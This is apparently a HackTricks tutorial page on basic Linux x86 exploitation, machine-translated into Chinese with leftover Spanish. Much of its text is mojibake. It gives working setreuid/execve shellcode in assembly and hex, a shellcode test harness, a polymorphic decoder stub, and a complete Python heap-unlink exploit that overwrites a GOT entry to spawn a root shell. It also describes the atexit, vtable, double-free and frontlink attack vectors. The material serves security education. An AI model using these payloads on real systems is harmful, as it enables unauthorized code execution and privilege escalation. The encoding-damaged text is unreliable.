# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## **2.SHELLCODE**

æŸ¥çœ‹å†…æ ¸ä¸­æ–­ï¼šcat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; æ¸…ç©º eax\
xor ebx, ebx ; ebx = 0 å› ä¸ºæ²¡æœ‰å‚æ•°è¦ä¼ \
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; æ‰§è¡Œç³»ç»Ÿè°ƒç”¨

**nasm -f elf assembly.asm** â€”> è¿”å›ä¸€ä¸ª .o æ–‡ä»¶\
**ld assembly.o -o shellcodeout** â€”> ç”Ÿæˆä¸€ä¸ªç”±æ±‡ç¼–ä»£ç ç»„æˆçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯ä»¥ç”¨ **objdump** æå–æ“ä½œç \
**objdump -d -Mintel ./shellcodeout** â€”> æŸ¥çœ‹ç¡®å®æ˜¯æˆ‘ä»¬çš„ shellcode å¹¶æå– OpCodes

**æ£€æŸ¥ shellcode æ˜¯å¦æœ‰æ•ˆ**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Para ver que las llamadas al sistema se realizan correctamente se debe compilar el programa anterior y las llamadas del sistema deben aparecer en **strace ./PROGRAMA\_COMPILADO**

A la hora de crear shellcodes se puede realizar un truco. La primera instrucciÃ³n es un jump a un call. El call llama al cÃ³digo original y ademÃ¡s mete en el stack el EIP. DespuÃ©s de la instrucciÃ³n call hemos metido el string que necesitÃ¡semos, por lo que con ese EIP podemos seÃ±alar al string y ademÃ¡s continuar ejecutando el cÃ³digo.

EJ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**EJ ä½¿ç”¨å †æ ˆ (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Egg Huter:**

ç”±ä¸€ä¸ªå°ä»£ç ç»„æˆï¼Œå®ƒéå†ä¸è¿›ç¨‹ç›¸å…³çš„å†…å­˜é¡µé¢ï¼Œå¯»æ‰¾å­˜å‚¨åœ¨å…¶ä¸­çš„ shellcodeï¼ˆæŸ¥æ‰¾åœ¨ shellcode ä¸­æ”¾ç½®çš„æŸä¸ªç­¾åï¼‰ã€‚åœ¨åªæœ‰å¾ˆå°çš„ç©ºé—´å¯ä»¥æ³¨å…¥ä»£ç çš„æƒ…å†µä¸‹éå¸¸æœ‰ç”¨ã€‚

**Shellcodes polimÃ³rficos**

ç”±åŠ å¯†çš„ shells ç»„æˆï¼ŒåŒ…å«ä¸€ä¸ªå°ä»£ç ç”¨äºè§£å¯†å¹¶è·³è½¬åˆ°å®ƒï¼Œä½¿ç”¨ Call-Pop æŠ€å·§ï¼Œè¿™å°†æ˜¯ä¸€ä¸ª **ejemplo cifrado cesar**ï¼š
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
## **5.è¡¥å……æ–¹æ³•**

**MuratæŠ€æœ¯**

åœ¨Linuxä¸­ï¼Œæ‰€æœ‰ç¨‹åºçš„æ˜ å°„ä»0xbfffffffå¼€å§‹ã€‚

é€šè¿‡è§‚å¯ŸLinuxä¸­æ–°è¿›ç¨‹çš„å †æ ˆæ„å»ºæ–¹å¼ï¼Œå¯ä»¥å¼€å‘ä¸€ä¸ªåˆ©ç”¨ç¨‹åºï¼Œä½¿å¾—ç¨‹åºåœ¨ä¸€ä¸ªå”¯ä¸€å˜é‡ä¸ºshellcodeçš„ç¯å¢ƒä¸­å¯åŠ¨ã€‚è¿™ä¸ªåœ°å€å¯ä»¥è®¡ç®—ä¸ºï¼šaddr = 0xbfffffff - 4 - strlen(å®Œæ•´å¯æ‰§è¡Œæ–‡ä»¶å) - strlen(shellcode)

è¿™æ ·å°±å¯ä»¥ç®€å•åœ°è·å¾—åŒ…å«shellcodeçš„ç¯å¢ƒå˜é‡çš„åœ°å€ã€‚

è¿™å¾—ç›Šäºexecleå‡½æ•°å…è®¸åˆ›å»ºä¸€ä¸ªåªåŒ…å«æ‰€éœ€ç¯å¢ƒå˜é‡çš„ç¯å¢ƒã€‚

###

### **æ ¼å¼å­—ç¬¦ä¸²å¯¼è‡´ç¼“å†²åŒºæº¢å‡º**

**sprintf**å°†æ ¼å¼åŒ–å­—ç¬¦ä¸²**ç§»åŠ¨åˆ°**ä¸€ä¸ª**å˜é‡**ä¸­ã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥æ»¥ç”¨å­—ç¬¦ä¸²çš„**æ ¼å¼**æ¥å¯¼è‡´**å˜é‡ä¸­çš„ç¼“å†²åŒºæº¢å‡º**ã€‚\
ä¾‹å¦‚ï¼Œè´Ÿè½½`%.44xAAAA`å°†**åœ¨å˜é‡ä¸­å†™å…¥44B+"AAAA"**ï¼Œè¿™å¯èƒ½å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºã€‚

### **\_\_atexitç»“æ„**

{% hint style="danger" %}
å¦‚ä»Šï¼Œåˆ©ç”¨è¿™ä¸ªæ˜¯éå¸¸**å¥‡æ€ªçš„**ã€‚
{% endhint %}

**`atexit()`**æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œ**å…¶ä»–å‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’ç»™å®ƒ**ã€‚è¿™äº›**å‡½æ•°**å°†åœ¨æ‰§è¡Œ**`exit()`**æˆ–**main**çš„**è¿”å›**æ—¶è¢«**æ‰§è¡Œ**ã€‚\
å¦‚æœæ‚¨å¯ä»¥**ä¿®æ”¹**è¿™äº›**å‡½æ•°**çš„**åœ°å€**ä»¥æŒ‡å‘shellcodeï¼Œä¾‹å¦‚ï¼Œæ‚¨å°†**è·å¾—å¯¹**è¯¥**è¿›ç¨‹**çš„**æ§åˆ¶**ï¼Œä½†è¿™ç›®å‰æ›´å¤æ‚ã€‚\
ç›®å‰ï¼Œ**è¦æ‰§è¡Œçš„å‡½æ•°çš„åœ°å€**è¢«**éšè—**åœ¨å¤šä¸ªç»“æ„åé¢ï¼Œæœ€ç»ˆæŒ‡å‘çš„åœ°å€ä¸æ˜¯å‡½æ•°çš„åœ°å€ï¼Œè€Œæ˜¯**ç”¨XORåŠ å¯†**å’Œç”¨**éšæœºå¯†é’¥**è¿›è¡Œä½ç§»ã€‚å› æ­¤ï¼Œç›®å‰è¿™ä¸ªæ”»å‡»å‘é‡åœ¨x86å’Œx64\_86ä¸Š**ä¸æ˜¯å¾ˆæœ‰ç”¨**ã€‚\
**åŠ å¯†å‡½æ•°**æ˜¯**`PTR_MANGLE`**ã€‚**å…¶ä»–æ¶æ„**å¦‚m68kã€mips32ã€mips64ã€aarch64ã€armã€hppa...**ä¸å®ç°åŠ å¯†**å‡½æ•°ï¼Œå› ä¸ºå®ƒ**è¿”å›ä¸è¾“å…¥ç›¸åŒ**ã€‚å› æ­¤ï¼Œè¿™äº›æ¶æ„å¯ä»¥é€šè¿‡è¿™ä¸ªå‘é‡è¿›è¡Œæ”»å‡»ã€‚

### **setjmp() & longjmp()**

{% hint style="danger" %}
å¦‚ä»Šï¼Œåˆ©ç”¨è¿™ä¸ªæ˜¯éå¸¸**å¥‡æ€ªçš„**ã€‚
{% endhint %}

**`setjmp()`**å…è®¸**ä¿å­˜****ä¸Šä¸‹æ–‡**ï¼ˆå¯„å­˜å™¨ï¼‰\
**`longjmp()`**å…è®¸**æ¢å¤****ä¸Šä¸‹æ–‡**ã€‚\
**ä¿å­˜çš„å¯„å­˜å™¨**æ˜¯ï¼š`EBX, ESI, EDI, ESP, EIP, EBP`\
å‘ç”Ÿçš„äº‹æƒ…æ˜¯EIPå’ŒESPé€šè¿‡**`PTR_MANGLE`**å‡½æ•°ä¼ é€’ï¼Œå› æ­¤**æ˜“å—æ­¤æ”»å‡»çš„æ¶æ„ä¸ä¸Šè¿°ç›¸åŒ**ã€‚\
å®ƒä»¬å¯¹äºé”™è¯¯æ¢å¤æˆ–ä¸­æ–­å¾ˆæœ‰ç”¨ã€‚\
ç„¶è€Œï¼Œæ ¹æ®æˆ‘æ‰€è¯»åˆ°çš„ï¼Œå…¶ä»–å¯„å­˜å™¨æ²¡æœ‰å—åˆ°ä¿æŠ¤ï¼Œ**å› æ­¤å¦‚æœåœ¨è¢«è°ƒç”¨çš„å‡½æ•°å†…éƒ¨æœ‰`call ebx`ã€`call esi`æˆ–`call edi`**ï¼Œåˆ™å¯ä»¥æ§åˆ¶ã€‚æˆ–è€…æ‚¨ä¹Ÿå¯ä»¥ä¿®æ”¹EBPä»¥ä¿®æ”¹ESPã€‚

**C++ä¸­çš„VTableå’ŒVPTR**

æ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ª**Vtable**ï¼Œå®ƒæ˜¯ä¸€ä¸ª**æŒ‡å‘æ–¹æ³•çš„æŒ‡é’ˆæ•°ç»„**ã€‚

æ¯ä¸ª**ç±»**çš„å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª**VPtr**ï¼Œå®ƒæ˜¯æŒ‡å‘å…¶ç±»æ•°ç»„çš„**æŒ‡é’ˆ**ã€‚VPtræ˜¯æ¯ä¸ªå¯¹è±¡çš„å¤´éƒ¨çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤å¦‚æœæˆåŠŸ**è¦†ç›–**äº†**VPtr**ï¼Œåˆ™å¯ä»¥**ä¿®æ”¹**å®ƒä»¥**æŒ‡å‘**ä¸€ä¸ªè™šæ‹Ÿæ–¹æ³•ï¼Œä»è€Œæ‰§è¡Œä¸€ä¸ªå‡½æ•°å°†è½¬åˆ°shellcodeã€‚

## **é¢„é˜²æªæ–½å’Œè§„é¿**

###

**Libsafeæ›¿æ¢**

é€šè¿‡ä»¥ä¸‹æ–¹å¼æ¿€æ´»ï¼šLD\_PRELOAD=/lib/libsafe.so.2\
æˆ–\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

æ‹¦æˆªå¯¹æŸäº›ä¸å®‰å…¨å‡½æ•°çš„è°ƒç”¨ï¼Œæ›¿æ¢ä¸ºå…¶ä»–å®‰å…¨å‡½æ•°ã€‚æœªæ ‡å‡†åŒ–ã€‚ï¼ˆä»…é€‚ç”¨äºx86ï¼Œä¸é€‚ç”¨äºä½¿ç”¨-fomit-frame-pointerçš„ç¼–è¯‘ï¼Œä¸é€‚ç”¨äºé™æ€ç¼–è¯‘ï¼Œå¹¶éæ‰€æœ‰æ˜“å—æ”»å‡»çš„å‡½æ•°éƒ½å˜å¾—å®‰å…¨ï¼ŒLD\_PRELOADåœ¨å…·æœ‰suidçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ— æ•ˆï¼‰ã€‚

**ASCIIè£…ç”²åœ°å€ç©ºé—´**

å®ƒçš„ç›®çš„æ˜¯å°†å…±äº«åº“åŠ è½½åˆ°0x00000000åˆ°0x00ffffffä¹‹é—´ï¼Œä»¥ç¡®ä¿å§‹ç»ˆæœ‰ä¸€ä¸ªå­—èŠ‚0x00ã€‚ç„¶è€Œï¼Œè¿™å®é™…ä¸Šå‡ ä¹æ— æ³•é˜»æ­¢ä»»ä½•æ”»å‡»ï¼Œå°¤å…¶æ˜¯åœ¨å°ç«¯æ¨¡å¼ä¸‹ã€‚

**ret2plt**

å®ƒçš„ç›®çš„æ˜¯æ‰§è¡ŒROPï¼Œä½¿å¾—è°ƒç”¨strcpy@pltï¼ˆæ¥è‡ªpltï¼‰å¹¶æŒ‡å‘GOTçš„å…¥å£ï¼Œå¹¶å°†è¦è°ƒç”¨çš„å‡½æ•°çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ï¼ˆsystem()ï¼‰ã€‚æ¥ä¸‹æ¥ï¼ŒåšåŒæ ·çš„äº‹æƒ…ï¼ŒæŒ‡å‘GOT+1å¹¶å¤åˆ¶system()çš„ç¬¬äºŒä¸ªå­—èŠ‚â€¦â€¦æœ€åè°ƒç”¨ä¿å­˜åœ¨GOTä¸­çš„åœ°å€ï¼Œè¿™å°†æ˜¯system()ã€‚

**ä½¿ç”¨chroot()çš„ç›‘ç‹±**

debootstrap -arch=i386 hardy /home/user â€”> åœ¨ç‰¹å®šå­ç›®å½•ä¸‹å®‰è£…åŸºæœ¬ç³»ç»Ÿ

ç®¡ç†å‘˜å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼é€€å‡ºè¿™äº›ç›‘ç‹±ï¼šmkdir foo; chroot foo; cd ..

**ä»£ç æ’è£…**

Valgrind â€”> æŸ¥æ‰¾é”™è¯¯\
Memcheck\
RADï¼ˆè¿”å›åœ°å€é˜²å¾¡ï¼‰\
Insure++

## **8 å †æº¢å‡ºï¼šåŸºæœ¬åˆ©ç”¨**

**åˆ†é…å—**

prev\_size |\
size | â€”å¤´éƒ¨\
\*mem | æ•°æ®

**ç©ºé—²å—**

prev\_size |\
size |\
\*fd | å‰å‘å—æŒ‡é’ˆ\
\*bk | åå‘å—æŒ‡é’ˆ â€”å¤´éƒ¨\
\*mem | æ•°æ®

ç©ºé—²å—åœ¨ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼ˆbinï¼‰ä¸­ï¼Œä¸”ä¸èƒ½æœ‰ä¸¤ä¸ªç©ºé—²å—ç›¸é‚»ï¼ˆä¼šåˆå¹¶ï¼‰ã€‚

åœ¨â€œsizeâ€ä¸­æœ‰ä½è¡¨ç¤ºï¼šå¦‚æœå‰ä¸€ä¸ªå—æ­£åœ¨ä½¿ç”¨ï¼Œå¦‚æœå—æ˜¯é€šè¿‡mmap()åˆ†é…çš„ï¼Œä»¥åŠå—æ˜¯å¦å±äºä¸»arenaã€‚

å¦‚æœé‡Šæ”¾ä¸€ä¸ªå—æ—¶ï¼Œä»»ä½•ç›¸é‚»å—æ˜¯ç©ºé—²çš„ï¼Œè¿™äº›å—ä¼šé€šè¿‡unlink()å®åˆå¹¶ï¼Œå¹¶å°†æ–°çš„æ›´å¤§çš„å—ä¼ é€’ç»™frontlink()ä»¥æ’å…¥é€‚å½“çš„binã€‚

unlink(){\
BK = P->bk; â€”> æ–°å—çš„BKæ˜¯ä¹‹å‰ç©ºé—²å—çš„BK\
FD = P->fd; â€”> æ–°å—çš„FDæ˜¯ä¹‹å‰ç©ºé—²å—çš„FD\
FD->bk = BK; â€”> ä¸‹ä¸€ä¸ªå—çš„BKæŒ‡å‘æ–°å—\
BK->fd = FD; â€”> ä¸Šä¸€ä¸ªå—çš„FDæŒ‡å‘æ–°å—\
}

å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿå°†P->bkä¿®æ”¹ä¸ºshellcodeçš„åœ°å€ï¼Œå¹¶å°†P->fdä¿®æ”¹ä¸ºGOTæˆ–DTORSçš„å…¥å£åœ°å€å‡å»12ï¼Œå°±å¯ä»¥å®ç°ï¼š

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

è¿™æ ·åœ¨ç¨‹åºé€€å‡ºæ—¶å°±ä¼šæ‰§è¡Œshellcodeã€‚

æ­¤å¤–ï¼Œunlink()çš„ç¬¬4æ¡è¯­å¥å†™å…¥äº†ä¸€äº›å†…å®¹ï¼Œshellcodeå¿…é¡»ä¸ºæ­¤è¿›è¡Œä¿®å¤ï¼š

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> è¿™ä¼šå¯¼è‡´ä»shellcodeçš„ç¬¬8ä¸ªå­—èŠ‚å¼€å§‹å†™å…¥4ä¸ªå­—èŠ‚ï¼Œå› æ­¤shellcodeçš„ç¬¬ä¸€æ¡æŒ‡ä»¤å¿…é¡»æ˜¯ä¸€ä¸ªjmpï¼Œä»¥è·³è¿‡è¿™éƒ¨åˆ†å¹¶è½å…¥ä¸€äº›nopsä¸­ï¼Œè¿›è€Œè¿›å…¥å…¶ä½™çš„shellcodeã€‚

å› æ­¤ï¼Œåˆ©ç”¨ç¨‹åºçš„åˆ›å»ºå¦‚ä¸‹ï¼š

åœ¨buffer1ä¸­æ”¾å…¥shellcodeï¼Œä»jmpå¼€å§‹ï¼Œä»¥ä¾¿è½å…¥nopsæˆ–å…¶ä½™çš„shellcodeã€‚

åœ¨shellcodeä¹‹åå¡«å……ï¼Œç›´åˆ°åˆ°è¾¾ä¸‹ä¸€ä¸ªå—çš„prev\_sizeå’Œsizeå­—æ®µã€‚åœ¨è¿™äº›ä½ç½®æ”¾å…¥0xfffffff0ï¼ˆä»¥ä¾¿è¦†ç›–prev\_sizeï¼Œä½¿å…¶å…·æœ‰è¡¨ç¤ºç©ºé—²çš„ä½ï¼‰å’Œâ€œ-4â€ï¼ˆ0xfffffffcï¼‰åœ¨sizeä¸­ï¼ˆä»¥ä¾¿å½“æ£€æŸ¥ç¬¬ä¸‰ä¸ªå—æ—¶ï¼Œå¦‚æœç¬¬äºŒä¸ªå—å®é™…ä¸Šæ˜¯ç©ºé—²çš„ï¼Œå®ƒä¼šè½¬åˆ°ä¿®æ”¹åçš„prev\_sizeï¼Œå‘Šè¯‰å®ƒæ˜¯ç©ºé—²çš„ï¼‰-> è¿™æ ·ï¼Œå½“free()æ£€æŸ¥æ—¶ï¼Œå®ƒå°†è½¬åˆ°ç¬¬ä¸‰ä¸ªå—çš„sizeï¼Œä½†å®é™…ä¸Šä¼šè½¬åˆ°ç¬¬äºŒä¸ªå—-4ï¼Œå¹¶è®¤ä¸ºç¬¬äºŒä¸ªå—æ˜¯ç©ºé—²çš„ã€‚ç„¶åå°†è°ƒç”¨**unlink()**ã€‚

è°ƒç”¨unlink()æ—¶ï¼Œå°†ä½¿ç”¨ç¬¬äºŒä¸ªå—çš„å‰å‡ ä¸ªæ•°æ®ä½œä¸ºP->fdï¼Œå› æ­¤å°†æ”¾å…¥è¦è¦†ç›–çš„åœ°å€-12ï¼ˆå› ä¸ºåœ¨FD->bkä¸­å°†åŠ 12åˆ°FDä¸­ä¿å­˜çš„åœ°å€ï¼‰ã€‚åœ¨è¯¥åœ°å€ä¸­ï¼Œå°†æ”¾å…¥ç¬¬äºŒä¸ªå—ä¸­æ‰¾åˆ°çš„ç¬¬äºŒä¸ªåœ°å€ï¼Œæˆ‘ä»¬å¸Œæœ›å®ƒæ˜¯æŒ‡å‘shellcodeçš„åœ°å€ï¼ˆä¼ªé€ çš„P->bkï¼‰ã€‚

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12å­—èŠ‚å¡«å……**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #éœ€è¦ç¡®ä¿è¡¨ç¤ºå‰ä¸€ä¸ªå—ç©ºé—²çš„ä½ä¸º1**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4ï¼Œä»¥ä¾¿å®ƒè®¤ä¸ºç¬¬ä¸‰ä¸ªå—çš„â€œsizeâ€åœ¨4å­—èŠ‚ä¹‹å‰ï¼ˆæŒ‡å‘prev\_sizeï¼‰ï¼Œå› ä¸ºå®ƒåœ¨è¿™é‡Œæ£€æŸ¥ç¬¬äºŒä¸ªå—æ˜¯å¦ç©ºé—²**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #åœ¨è´Ÿè½½çš„å¼€å¤´æ”¾å…¥8å­—èŠ‚çš„å¡«å……**

**got\_free = pack("\<I", 0x08048300 - 12) #free()åœ¨pltä¸­çš„åœ°å€-12ï¼ˆå°†æ˜¯è¦è¦†ç›–çš„åœ°å€ï¼Œä»¥ä¾¿åœ¨ç¬¬äºŒæ¬¡è°ƒç”¨freeæ—¶æ‰§è¡Œshellcodeï¼‰**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #å¦‚å‰æ‰€è¿°ï¼Œè´Ÿè½½ä»¥8å­—èŠ‚çš„å¡«å……å¼€å§‹**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #ä¿®æ”¹ç¬¬äºŒä¸ªå—ï¼Œgot\_freeæŒ‡å‘æˆ‘ä»¬å°†ä¿å­˜åœ°å€addr\_sc + 12çš„åœ°æ–¹**

**os.system("./8.3.o " + payload)**

**unset() ä»¥ç›¸åé¡ºåºé‡Šæ”¾ï¼ˆwargameï¼‰**

æˆ‘ä»¬æ§åˆ¶äº†3ä¸ªè¿ç»­çš„å—ï¼Œå¹¶ä»¥ä¸åˆ†é…ç›¸åçš„é¡ºåºé‡Šæ”¾å®ƒä»¬ã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼š

åœ¨å—cä¸­æ”¾å…¥shellcode

å—aç”¨äºè¦†ç›–å—bï¼Œä»¥ä¾¿sizeå…·æœ‰PREV\_INUSEä½è¢«ç¦ç”¨ï¼Œä»è€Œä½¿å—aè¢«è®¤ä¸ºæ˜¯ç©ºé—²çš„ã€‚

æ­¤å¤–ï¼Œåœ¨å—bçš„å¤´éƒ¨è¦†ç›–sizeï¼Œä½¿å…¶å€¼ä¸º-4ã€‚

å› æ­¤ï¼Œç¨‹åºå°†è®¤ä¸ºâ€œaâ€æ˜¯ç©ºé—²çš„ï¼Œå¹¶åœ¨ä¸€ä¸ªbinä¸­ï¼Œå› æ­¤å°†è°ƒç”¨unlink()ä»¥è§£é™¤é“¾æ¥ã€‚ç„¶è€Œï¼Œç”±äºPREV\_SIZEå¤´éƒ¨çš„å€¼ä¸º-4ï¼Œå®ƒå°†è®¤ä¸ºâ€œaâ€çš„å—å®é™…ä¸Šä»b+4å¼€å§‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒå°†å¯¹ä»b+4å¼€å§‹çš„å—è¿›è¡Œunlink()ï¼Œå› æ­¤åœ¨b+12å¤„å°†æ˜¯æŒ‡é’ˆâ€œfdâ€ï¼Œåœ¨b+16å¤„å°†æ˜¯æŒ‡é’ˆâ€œbkâ€ã€‚

è¿™æ ·ï¼Œå¦‚æœåœ¨bkä¸­æ”¾å…¥æŒ‡å‘shellcodeçš„åœ°å€ï¼Œå¹¶åœ¨fdä¸­æ”¾å…¥æŒ‡å‘â€œputs()â€çš„åœ°å€-12ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†æˆ‘ä»¬çš„è´Ÿè½½ã€‚

**å‰é“¾æŠ€æœ¯**

å½“é‡Šæ”¾æŸä¸ªä¸œè¥¿ä¸”å…¶ç›¸é‚»å—éƒ½ä¸æ˜¯ç©ºé—²æ—¶ï¼Œç§°ä¸ºå‰é“¾ï¼Œä¸è°ƒç”¨unlink()ï¼Œè€Œæ˜¯ç›´æ¥è°ƒç”¨frontlink()ã€‚

å½“æ”»å‡»çš„mallocä»æœªè¢«é‡Šæ”¾æ—¶ï¼Œè¿™ç§æ¼æ´å¾ˆæœ‰ç”¨ã€‚

éœ€è¦ï¼š

ä¸€ä¸ªå¯ä»¥é€šè¿‡è¾“å…¥æ•°æ®å‡½æ•°æº¢å‡ºçš„ç¼“å†²åŒº

ä¸€ä¸ªä¸æ­¤ç›¸é‚»çš„ç¼“å†²åŒºï¼Œå¿…é¡»è¢«é‡Šæ”¾ï¼Œå¹¶ä¸”å…¶å¤´éƒ¨çš„fdå­—æ®µå°†é€šè¿‡å‰ä¸€ä¸ªç¼“å†²åŒºçš„æº¢å‡ºè¿›è¡Œä¿®æ”¹

ä¸€ä¸ªè¦é‡Šæ”¾çš„ç¼“å†²åŒºï¼Œå…¶å¤§å°å¤§äº512ä½†å°äºå‰ä¸€ä¸ªç¼“å†²åŒº

åœ¨ç¬¬3æ­¥ä¹‹å‰å£°æ˜çš„ç¼“å†²åŒºï¼Œå…è®¸è¦†ç›–æ­¤ç¼“å†²åŒºçš„prev\_size

é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸¤ä¸ªmallocä¸­ä¸å—æ§åˆ¶åœ°è¦†ç›–ï¼Œå¹¶åœ¨ä¸€ä¸ªä¸­ä»¥å—æ§æ–¹å¼è¦†ç›–ï¼Œä½†åªé‡Šæ”¾é‚£ä¸ªï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œåˆ©ç”¨ã€‚

**åŒé‡é‡Šæ”¾æ¼æ´**

å¦‚æœå¯¹åŒä¸€æŒ‡é’ˆè°ƒç”¨ä¸¤æ¬¡free()ï¼Œåˆ™ä¼šæœ‰ä¸¤ä¸ªbinsæŒ‡å‘åŒä¸€åœ°å€ã€‚

å¦‚æœæƒ³å†æ¬¡ä½¿ç”¨å…¶ä¸­ä¸€ä¸ªï¼Œå°†æ¯«æ— é—®é¢˜åœ°åˆ†é…ã€‚å¦‚æœæƒ³ä½¿ç”¨å¦ä¸€ä¸ªï¼Œå°†åˆ†é…ç›¸åŒçš„ç©ºé—´ï¼Œå› æ­¤æˆ‘ä»¬å°†æœ‰æŒ‡é’ˆâ€œfdâ€å’Œâ€œbkâ€è¢«ä¼ªé€ ï¼ŒåŒ…å«å…ˆå‰åˆ†é…çš„æ•°æ®ã€‚

**é‡Šæ”¾å**

ä¸€ä¸ªå…ˆå‰é‡Šæ”¾çš„æŒ‡é’ˆåœ¨æ²¡æœ‰æ§åˆ¶çš„æƒ…å†µä¸‹å†æ¬¡ä½¿ç”¨ã€‚

## **8 å †æº¢å‡ºï¼šé«˜çº§åˆ©ç”¨**

unlink()å’Œfrontlink()æŠ€æœ¯åœ¨ä¿®æ”¹unlink()å‡½æ•°åè¢«åˆ é™¤ã€‚

